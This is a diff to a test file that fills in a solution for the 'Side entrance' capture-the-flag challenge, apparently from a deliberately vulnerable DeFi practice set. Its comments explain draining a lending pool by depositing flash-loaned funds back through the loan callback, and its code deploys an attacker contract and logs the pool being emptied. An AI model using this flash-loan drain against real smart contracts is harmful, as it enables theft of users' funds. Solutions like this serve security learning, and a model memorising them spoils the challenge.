@@ -24,7 +24,19 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        //Our pool has an exploitable external call inside its flashloan function, that will call our attacker contract,
+        //implementing the interfaced execute() function. The last require statement of flashloan() does not complain 
+        //if the total balance itself is the same as before. Via the external call, we are able to trick balances
+        //of our attacker contract to match the total amount deposited by the deployer. 
+        //After that, we can withdraw all that amount and forward it to our attacker address. 
+
+        const attackerFactory = await ethers.getContractFactory('SideEntranceLenderPoolAttacker');
+        const attackerContract = await attackerFactory.deploy(this.pool.address, attacker.address);
+        console.log("initial  balance", (await ethers.provider.getBalance(this.pool.address)).toString())
+        await attackerContract.connect(attacker).attack(ETHER_IN_POOL);
+        await attackerContract.connect(attacker).withdrawAndSend();
+        console.log("final pool balance ",(await ethers.provider.getBalance(this.pool.address)).toString())
+        console.log("final attacker balance ",(await ethers.provider.getBalance(attacker.address)).toString())
     });
 
     after(async function () {
